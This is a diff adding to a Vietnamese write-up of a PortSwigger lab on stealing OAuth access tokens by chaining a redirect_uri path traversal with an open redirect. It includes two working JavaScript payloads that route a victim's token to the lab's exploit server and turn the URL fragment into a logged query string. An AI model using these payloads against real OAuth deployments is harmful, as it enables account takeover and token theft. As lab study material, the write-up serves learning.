@@ -163,7 +163,46 @@ Ngoài `open redirect` ta có thể tìm các lỗi như:
 ## 4. Stealing OAuth access tokens via an open redirect
 https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
 
+Khi đăng nhập bằng OAuth ta thấy có `/auth?client_id=...` ở đây ta thử thay đổi với `redirect_uri` nhưng không thành công, ta nhận ra là đoạn `https://0a7b008e03cbaabf83c61a5d0096000a.web-security-academy.net/oauth-callback` không thay đổi được, nhưng lại có thể dùng `../` để truy cập trang tùy ý:\
+![alt text](image-6.png)\
+![alt text](image-7.png)
+
+Ta thấy nó đã chuyển đến post 1 theo như đường dẫn và token ở dưới dạng URL fragment
+
+Ngoài ra ta thấy khi dùng `Next Post` ta có request:\
+![alt text](image-8.png)
+
+Ta thấy nó dùng 1 `path` để chỉ ra đường dẫn tiếp theo, ta thử thay thế bằng 1 URL:\
+![alt text](image-9.png)\
+![alt text](image-10.png)
+
+Như vậy có thể chuyển hướng thành công.
+
+Nối 2 bug này lại, ta thấy nếu `redirect_uri` = `https://0a7b008e03cbaabf83c61a5d0096000a.web-security-academy.net/oauth-callback/../post/next?path=server_hacker` thì nó sẽ request đến server hacker và mang theo token dưới dạng URL fragment
+
+Payload: 
+```html
+<script>
+        window.location = 'https://oauth-0abf006a0347aa3283111885023600b8.oauth-server.net/auth?client_id=o0xlegmb78og8n6q2ftfo&redirect_uri=https://0a7b008e03cbaabf83c61a5d0096000a.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab0000603d1aa1b837c1927010400ff.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+</script>
+```
+
+Nhưng với payload này khi ta test, nó sẽ liên tục nhận về `token` mới do ta truy cập đến `/exploit` thì nó gửi request tiếp:\ 
+![alt text](image-11.png)
 
 
+Nhưng vấn đề là khi token nằm ở fragment nó sẽ ko được ghi vào log để ta quan sát, ta cần thêm 1 code để khi nó có `#` nó sẽ chuyển về param để ghi vào log:
 
+```html
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-0abf006a0347aa3283111885023600b8.oauth-server.net/auth?client_id=o0xlegmb78og8n6q2ftfo&redirect_uri=https://0a7b008e03cbaabf83c61a5d0096000a.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab0000603d1aa1b837c1927010400ff.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    }
+else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+![alt text](image-12.png)\
+![alt text](image-13.png)
 
